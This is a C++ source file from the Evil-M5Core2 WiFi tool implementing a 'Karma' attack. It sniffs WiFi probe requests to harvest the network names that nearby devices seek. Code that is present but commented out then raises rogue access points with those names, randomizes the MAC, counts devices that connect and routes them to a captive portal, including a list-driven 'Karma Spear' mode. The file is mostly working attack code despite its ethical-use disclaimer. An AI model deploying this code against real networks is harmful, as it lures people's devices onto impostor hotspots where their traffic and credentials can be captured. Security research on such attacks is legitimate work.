/*
    Evil-M5Core2 - WiFi Network Testing and Exploration Tool

    Copyright (c) 2024 7h30th3r0n3
    Copyright (c) 2024 lvlhead

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

    Disclaimer:
    This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
    Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
    assumes no liability and is not responsible for any misuse or damage caused by this tool.
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
*/

extern "C" {
    #include "esp_wifi.h"
    #include "esp_wifi_types.h"
    #include "esp_system.h"
}

#include "evil-karma.h"

bool isAPDeploying = false;
bool newSSIDAvailable = false;
bool isScanningKarma = false;
int ssid_count_Karma = 0;
char lastSSID[33] = {0};

EvilKarma::EvilKarma() {
    isKarmaMode = false;
    isProbeSniffingMode = false;
    isProbeKarmaAttackMode = false;
    currentIndexKarma = -1;
    menuStartIndexKarma = 0;
    menuSizeKarma = 0;
    maxMenuDisplayKarma = 9;
    autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
    isAutoKarmaActive = false;
    isWaitingForProbeDisplayed = false;
    lastProbeDisplayUpdate = 0;
    probeDisplayState = 0;
    isInitialDisplayDone = false;
    lastDeployedSSID[33] = {0};
    karmaSuccess = false;
}

void EvilKarma::emptyKarmaCallback(CallbackMenuItem& menuItem) {
    M5.Display.clear();
    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Stop");
}

void EvilKarma::showKarmaApp() {
    // Set up application for first run
    if (!isAppRunning) {
        toggleAppRunning();
    }

    // Run the app
}

void EvilKarma::closeKarmaApp() {
    ui.waitAndReturnToMenu("Stop detection...");
    toggleAppRunning();
}

void EvilKarma::emptyAutoKarmaCallback(CallbackMenuItem& menuItem) {
    M5.Display.clear();
    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Stop");
}

void EvilKarma::showAutoKarmaApp() {
    // Set up application for first run
    if (!isAppRunning) {
        isScanningKarma = true;
        ssid_count_Karma = 0;
        M5.Display.clear();
        //drawStopButtonKarma();
        //bluetoothEnabled = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_deinit();
        delay(300); //petite pause
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

        config.readConfigFile();
        seenWhitelistedSSIDs.clear();

        sendMessage("-------------------");
        sendMessage("Probe Sniffing Started...");
        sendMessage("-------------------");
        toggleAppRunning();
    }

    // Run the app
}

void EvilKarma::closeAutoKarmaApp() {
    sendMessage("-------------------");
    sendMessage("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
    sendMessage("-------------------");
    isScanningKarma = false;
    esp_wifi_set_promiscuous(false);


    //if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
    if (ssid_count_Karma > 0) {
        sendMessage("Saving SSIDs to SD card automatically...");
        for (int i = 0; i < ssid_count_Karma; i++) {
            saveSSIDToFile(ssidsKarma[i]);
        }
        sendMessage(String(ssid_count_Karma) + " SSIDs saved on SD.");
    } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
        bool saveSSID = ui.confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?", true);
        if (saveSSID) {
            M5.Display.clear();
            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
            M5.Display.println("Saving SSIDs on SD..");
            for (int i = 0; i < ssid_count_Karma; i++) {
                saveSSIDToFile(ssidsKarma[i]);
            }
            M5.Display.clear();
            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
            M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
            sendMessage("-------------------");
            sendMessage(String(ssid_count_Karma) + " SSIDs saved on SD.");
            sendMessage("-------------------");
        } else {
            M5.Display.clear();
            M5.Display.setCursor(50 , M5.Display.height()/ 2 );
            M5.Display.println("  No SSID saved.");
        }
        delay(1000);
        memset(ssidsKarma, 0, sizeof(ssidsKarma));
        ssid_count_Karma = 0;
    }


    menuSizeKarma = ssid_count_Karma;
    currentIndexKarma = 0;
    menuStartIndexKarma = 0;
/*
    if (isKarmaMode && ssid_count_Karma > 0) {
        //drawMenuKarma();
        currentStateKarma = StopScanKarma;
    } else {
        currentStateKarma = StartScanKarma;
        //ui.setInMenu(true);
    }*/
    isKarmaMode = false;
    isProbeSniffingMode = false;
    //stopProbeSniffingViaSerial = false;
    toggleAppRunning();
}

void EvilKarma::toggleAppRunning() {
    isAppRunning = !isAppRunning;
}

void EvilKarma::setIsKarmaMode(bool state) {
    isKarmaMode = state;
}

bool EvilKarma::getIsAutoKarmaActive() {
    return isAutoKarmaActive;
}

bool EvilKarma::getIsProbeKarmaAttackMode() {
    return isProbeKarmaAttackMode;
}

bool EvilKarma::getIsProbeSniffingMode() {
    return isProbeSniffingMode;
}

void EvilKarma::setIsProbeSniffingMode(bool state) {
    isProbeSniffingMode = state;
}

void EvilKarma::saveSSIDToFile(const char* ssid) {
    bool ssidExists = false;
    File readfile = openFile("/probes.txt", FILE_READ);

    if (readfile) {
        while (readfile.available()) {
            String line = readfile.readStringUntil('\n');
            if (line.equals(ssid)) {
                ssidExists = true;
                break;
            }
        }
        readfile.close();
    }
    if (!ssidExists) {
        File file = openFile("/probes.txt", FILE_APPEND);
        if (file) {
            file.println(ssid);
            file.close();
        } else {
            sendMessage("Error opening probes.txt");
        }
    }
}

void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || isAPDeploying) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (frame_type == 0x40) {
        uint8_t ssid_length_Karma_Auto = frame[25];
        if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
            char tempSSID[33];
            memset(tempSSID, 0, sizeof(tempSSID));
            for (int i = 0; i < ssid_length_Karma_Auto; i++) {
                tempSSID[i] = (char)frame[26 + i];
            }
            tempSSID[ssid_length_Karma_Auto] = '\0';
            memset(lastSSID, 0, sizeof(lastSSID));
            strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
            newSSIDAvailable = true;
        }
    }
}

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];
/*
    if (ssid_count_Karma == 0) {
        ui.writeSingleMessage("Waiting for probe...", false);
    }
*/
    if (frame_type == 0x40) { // Probe Request Frame
        uint8_t ssid_length_Karma = frame[25];
        if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
            char ssidKarma[33] = {0};
            memcpy(ssidKarma, &frame[26], ssid_length_Karma);
            ssidKarma[ssid_length_Karma] = '\0';
            if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
                return;
            }

            bool ssidExistsKarma = false;
            for (int i = 0; i < ssid_count_Karma; i++) {
                if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
                    ssidExistsKarma = true;
                    break;
                }
            }

/*
            if (config.isSSIDWhitelisted(ssidKarma)) {
                if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
                    seenWhitelistedSSIDs.insert(ssidKarma);
                    sendMessage("SSID in whitelist, ignoring: " + String(ssidKarma));
                }
                return;
            }
*/
            if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
                strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
                //updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
                sendMessage("Found: " + String(ssidKarma));
/*
#if LED_ENABLED
                led.pattern5();
#endif
*/
            }
        }
    }
}

//
// OLD CODE
//
/*
void karmaAttack() {
    drawStartButtonKarma();
}

void drawStartButtonKarma() {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_GREEN);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.println("Start Sniff");
    M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.println("Stop Sniff");
    M5.Display.setTextColor(TFT_WHITE);
}

void handleMenuInputKarma() {
    bool stateChanged = false;

    if (M5.BtnA.wasPressed()) {
        currentIndexKarma--;
        if (currentIndexKarma < 0) {
            currentIndexKarma = menuSizeKarma - 1;
        }
        stateChanged = true;
    } else if (M5.BtnC.wasPressed()) {
        currentIndexKarma++;
        if (currentIndexKarma >= menuSizeKarma) {
            currentIndexKarma = 0;
        }
        stateChanged = true;
    }

    if (stateChanged) {
        menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
    }

    if (M5.BtnB.wasPressed()) {
        executeMenuItemKarma(currentIndexKarma);
        stateChanged = true;
    }
    if (stateChanged) {
        drawMenuKarma();
    }
}


void drawMenuKarma() {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.setTextFont(1);

    int lineHeight = 24;
    int startX = 10;
    int startY = 25;

    for (int i = 0; i < maxMenuDisplayKarma; i++) {
        int menuIndexKarma = menuStartIndexKarma + i;
        if (menuIndexKarma >= menuSizeKarma) break;

        if (menuIndexKarma == currentIndexKarma) {
            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
        M5.Display.println(ssidsKarma[menuIndexKarma]);
    }
    M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
    if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
        startAPWithSSIDKarma(ssidsKarma[indexKarma]);
    } else {
        M5.Display.clear();
        M5.Display.println("Selection invalide!");
        delay(1000);
        drawStartButtonKarma();
        currentStateKarma = StartScanKarma;
    }
}

void startAPWithSSIDKarma(const char* ssid) {
    currentClonedSSID = ssid;
    isProbeKarmaAttackMode = true;
    config.readConfigFile();
    //createCaptivePortal();

    sendMessage("-------------------");
    sendMessage("Karma Attack started for: " + String(ssid));
    sendMessage("-------------------");

    M5.Display.clear();
    unsigned long startTime = millis();
    unsigned long currentTime;
    int remainingTime;
    int clientCount = 0;
    int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)

    while (true) {
        M5.update();
        handleDnsRequestSerial();
        currentTime = millis();
        remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
        clientCount = WiFi.softAPgetStationNum();

        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
        M5.Display.println(String(ssid));

        int textWidth = 12 * 16;
        M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 90, textWidth, 20, TFT_BLACK);
        M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 90);
        M5.Display.print("Left Time: ");
        M5.Display.print(remainingTime);
        M5.Display.println(" s");

        textWidth = 12 * 20;
        M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 130, textWidth, 20, TFT_BLACK);
        M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 130);
        M5.Display.print("Connected Client: ");
        M5.Display.println(clientCount);

        sendMessage("---Karma-Attack---");
        sendMessage("On :" + String(ssid));
        sendMessage("Left Time: " + String(remainingTime) + "s");
        sendMessage("Connected Client: "+ String(clientCount));
        sendMessage("-------------------");


        M5.Display.setCursor(130, 220);
        M5.Display.println(" Stop");
        M5.Display.display();

        if (remainingTime <= 0) {
            break;
        }
        if (M5.BtnB.wasPressed()) {
            break;
        } else {
            delay(200);
        }
    }

    if (clientCount > 0) {
        ui.writeSingleMessage("Karma Successful!!!", true);
        sendMessage("-------------------");
        sendMessage("Karma Attack worked !");
        sendMessage("-------------------");
    } else {
        ui.writeSingleMessage(" Karma Failed...", true);
        sendMessage("-------------------");
        sendMessage("Karma Attack failed...");
        sendMessage("-------------------");
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
    }
    delay(2000);
    if (ui.confirmPopup("Save " + String(ssid) + " ?" , true)) {
        saveSSIDToFile(ssid);
    }
    //ui.setInMenu(true);
    isProbeKarmaAttackMode = false;
    currentStateKarma = StartScanKarma;
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
}

//KARMA-PART-FUNCTIONS


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
    const int maxLength = 22;
    char truncatedSSID[23];

    M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 60, TFT_BLACK);
    int startIndexKarma = max(0, count - maxMenuDisplayKarma);

    for (int i = startIndexKarma; i < count; i++) {
        int lineIndexKarma = i - startIndexKarma;
        M5.Display.setCursor(0, lineIndexKarma * 20);

        if (strlen(ssidsKarma[i]) > maxLength) {
            strncpy(truncatedSSID, ssidsKarma[i], maxLength);
            truncatedSSID[maxLength] = '\0';
            M5.Display.printf("%d.%s", i + 1, truncatedSSID);
        } else {
            M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
        }
    }
    if ( count <= 9) {
        M5.Display.fillRect(M5.Display.width() - 15, 0, 15, 20, TFT_DARKGREEN);
        M5.Display.setCursor(M5.Display.width() - 13, 3);
    } else if ( count >= 10 && count <= 99){
        M5.Display.fillRect(M5.Display.width() - 30, 0, 30, 20, TFT_DARKGREEN);
        M5.Display.setCursor(M5.Display.width() - 27, 3);
    } else if ( count >= 100 && count < MAX_SSIDS_Karma*0.7){
        M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_ORANGE);
        M5.Display.setTextColor(TFT_BLACK);
        M5.Display.setCursor(M5.Display.width() - 42, 3);
        M5.Display.setTextColor(TFT_WHITE);
    } else {
        M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_RED);
        M5.Display.setCursor(M5.Display.width() - 42, 3);
    }
    if (count == MAX_SSIDS_Karma){
        M5.Display.printf("MAX");
    } else {
        M5.Display.printf("%d", count);
    }
    M5.Display.display();
}

void startAutoKarma() {
    //bluetoothEnabled = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300); // Petite pause pour s'assurer que tout est terminé
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

    isAutoKarmaActive = true;
    sendMessage("-------------------");
    sendMessage("Karma Auto Attack Started....");
    sendMessage("-------------------");

    config.readConfigFile();
    //createCaptivePortal();
    WiFi.softAPdisconnect(true);
    loopAutoKarma();
    esp_wifi_set_promiscuous(false);
}

uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
    esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
    esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}


void loopAutoKarma() {
    while (isAutoKarmaActive) {
        M5.update();

        if (M5.BtnB.wasPressed()) {
            isAutoKarmaActive = false;
            isAPDeploying = false;
            isAutoKarmaActive = false;
            isInitialDisplayDone = false;
            //ui.setInMenu(true);
            memset(lastSSID, 0, sizeof(lastSSID));
            memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
            newSSIDAvailable = false;
            esp_wifi_set_promiscuous(false);
            sendMessage("-------------------");
            sendMessage("Karma Auto Attack Stopped....");
            sendMessage("-------------------");
            break;
        }
        if (newSSIDAvailable) {
            newSSIDAvailable = false;
            activateAPForAutoKarma(lastSSID); // Activate the AP
            isWaitingForProbeDisplayed = false;
        } else {
            if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
                displayWaitingForProbe();
                sendMessage("-------------------");
                sendMessage("Waiting for probe....");
                sendMessage("-------------------");
                isWaitingForProbeDisplayed = true;
            }
        }

        delay(100);
    }

    memset(lastSSID, 0, sizeof(lastSSID));
    newSSIDAvailable = false;
    isWaitingForProbeDisplayed = false;
    isInitialDisplayDone = false;
    //ui.setInMenu(true);
}

void activateAPForAutoKarma(const char* ssid) {
    karmaSuccess = false;
    if (config.isSSIDWhitelisted(ssid)) {
        sendMessage("-------------------");
        sendMessage("SSID in the whitelist, skipping : " + String(ssid));
        sendMessage("-------------------");
#if LED_ENABLED
        led.pattern6();
#endif
        return;
    }
    if (strcmp(ssid, lastDeployedSSID) == 0) {
        sendMessage("-------------------");
        sendMessage("Skipping already deployed probe : " + String(lastDeployedSSID));
        sendMessage("-------------------");
#if LED_ENABLED
        led.pattern7();
#endif
        return;
    }
#if LED_ENABLED
    led.pattern8();
#endif
    isAPDeploying = true;
    isInitialDisplayDone = false;
    wireless.setRandomMAC_APKarma(); // Set random MAC for AP

    if (captivePortalPassword == "") {
        WiFi.softAP(ssid);
    } else {
        WiFi.softAP(ssid ,captivePortalPassword.c_str());
    }
    // Display MAC, SSID, and channel
    String macAddress = wireless.getMACAddress();
    sendMessage("-------------------");
    sendMessage("Starting Karma AP for : " + String(ssid));
    sendMessage("MAC Address: " + macAddress);
    sendMessage("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
    sendMessage("-------------------");
    unsigned long startTime = millis();

    while (millis() - startTime < autoKarmaAPDuration) {
        displayAPStatus(ssid, startTime, autoKarmaAPDuration);
        handleDnsRequestSerial();

        M5.update();

        if (M5.BtnB.wasPressed()) {
            memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
#if LED_ENABLED
            led.pattern9();
#endif
            break;
        }

        int clientCount = WiFi.softAPgetStationNum();
        if (clientCount > 0) {
            karmaSuccess = true;
            currentClonedSSID = ssid;
            isCaptivePortalOn = true;
            isAPDeploying = false;
            isAutoKarmaActive = false;
            isInitialDisplayDone = false;
            //ui.setInMenu(true);
            sendMessage("-------------------");
            sendMessage("Karma Successful for : " + currentClonedSSID);
            sendMessage("-------------------");
            memset(lastSSID, 0, sizeof(lastSSID));
            newSSIDAvailable = false;
            ui.waitAndReturnToMenu("Karma Successful !!! ");
            return;
        }
        delay(100);
    }
    strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    //bluetoothEnabled = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300); // Petite pause pour s'assurer que tout est terminé
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
    isAPDeploying = false;
    isWaitingForProbeDisplayed = false;

    newSSIDAvailable = false;
    isInitialDisplayDone = false;
    sendMessage("-------------------");
    sendMessage("Karma Fail for : " + String(ssid));
    sendMessage("-------------------");
#if LED_ENABLED
    led.pattern9();
#endif
}

void displayWaitingForProbe() {
    if (!isWaitingForProbeDisplayed) {
        M5.Display.clear();
        M5.Display.setTextColor(TFT_WHITE);
        M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
        M5.Display.setCursor(100, M5.Display.height() - 40);
        M5.Display.println("Stop Auto");
        M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
        M5.Display.print("Waiting for probe");

        isWaitingForProbeDisplayed = true;
    }

    unsigned long currentTime = millis();
    if (currentTime - lastProbeDisplayUpdate > 1000) {
        lastProbeDisplayUpdate = currentTime;
        probeDisplayState = (probeDisplayState + 1) % 4;

        int x = 50 + 12 * strlen("Waiting for probe");
        int y = M5.Display.height() / 2 - 20;
        int width = 36;
        int height = 20;

        M5.Display.fillRect(x, y, width, height, TFT_BLACK);

        M5.Display.setCursor(x, y);
        for (int i = 0; i < probeDisplayState; i++) {
            M5.Display.print(".");
        }
    }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
    unsigned long currentTime = millis();
    int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
    int clientCount = WiFi.softAPgetStationNum();

    if (!isInitialDisplayDone) {
        M5.Display.clear();
        M5.Display.setTextColor(TFT_WHITE);
        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
        M5.Display.println(String(ssid));
        M5.Display.setCursor((M5.Display.width() - 15 * strlen("Left Time: ")) / 2, 90);
        M5.Display.print("Left Time: ");
        M5.Display.setCursor((M5.Display.width() - 12 * strlen("Connected Client: ")) / 2, 130);
        M5.Display.print("Connected Client: ");

        M5.Display.setCursor(140, 220);
        M5.Display.println("Stop");
        isInitialDisplayDone = true;
    }

    int timeValuePosX = (M5.Display.width() + 12 * strlen("Left Time: ")) / 2;
    int timeValuePosY = 90;
    M5.Display.fillRect(timeValuePosX, timeValuePosY, 12 * 5, 20, TFT_BLACK);
    M5.Display.setCursor(timeValuePosX, timeValuePosY);
    M5.Display.print(remainingTime);
    M5.Display.println(" s");

    int clientValuePosX = (M5.Display.width() + 12 * strlen("Connected Client: ")) / 2;
    int clientValuePosY = 130;
    M5.Display.fillRect(clientValuePosX, clientValuePosY, 12 * 5, 20, TFT_BLACK);
    M5.Display.setCursor(clientValuePosX, clientValuePosY);
    M5.Display.print(clientCount);
}

//Auto karma end

void karmaSpear() {
    isAutoKarmaActive = true;
    //createCaptivePortal();
    File karmaListFile = openFile("/KarmaList.txt", FILE_READ);
    if (!karmaListFile) {
        sendMessage("Error opening KarmaList.txt");
        //returnToMenu(); // Retour au menu si le fichier ne peut pas être ouvert
        ui.waitAndReturnToMenu(" User requested return to menu.");
        return;
    }
    if (karmaListFile.available() == 0) {
        karmaListFile.close();
        sendMessage("KarmaFile empty.");
        //returnToMenu(); // Retour au menu si le fichier est vide
        ui.waitAndReturnToMenu(" User requested return to menu.");
        return;
    }

    // Compter le nombre total de lignes
    int totalLines = 0;
    while (karmaListFile.available()) {
        karmaListFile.readStringUntil('\n');
        totalLines++;
        if (M5.BtnA.wasPressed()) { // Vérifie si btnA est pressé
            karmaListFile.close();
            //returnToMenu();
            ui.waitAndReturnToMenu(" User requested return to menu.");
            return;
        }
    }
    karmaListFile.seek(0); // Revenir au début du fichier après le comptage

    int currentLine = 0;
    while (karmaListFile.available()) {
        if (M5.BtnA.isPressed()) { // Vérifie régulièrement si btnA est pressé
            karmaListFile.close();
            isAutoKarmaActive = false;
            ui.waitAndReturnToMenu("Karma Spear Stopped.");
            return;
        }

        String ssid = karmaListFile.readStringUntil('\n');
        ssid.trim();

        if (ssid.length() > 0) {
            activateAPForAutoKarma(ssid.c_str());
            sendMessage("Created Karma AP for SSID: " + ssid);
            displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);

            // Mise à jour de l'affichage
            int remainingLines = totalLines - (++currentLine);
            String displayText = String(remainingLines) + "/" + String(totalLines);
            M5.Display.setCursor((M5.Display.width() / 2) - 25, 10);
            M5.Display.print(displayText);

            if (karmaSuccess) {
                M5.Display.clear();
                break;
            }
            delay(200); // Peut-être insérer une vérification de btnA ici aussi
        }
    }
    karmaListFile.close();
    isAutoKarmaActive = false;
    sendMessage("Karma Spear Failed...");
    ui.waitAndReturnToMenu("Karma Spear Failed...");
}

*/
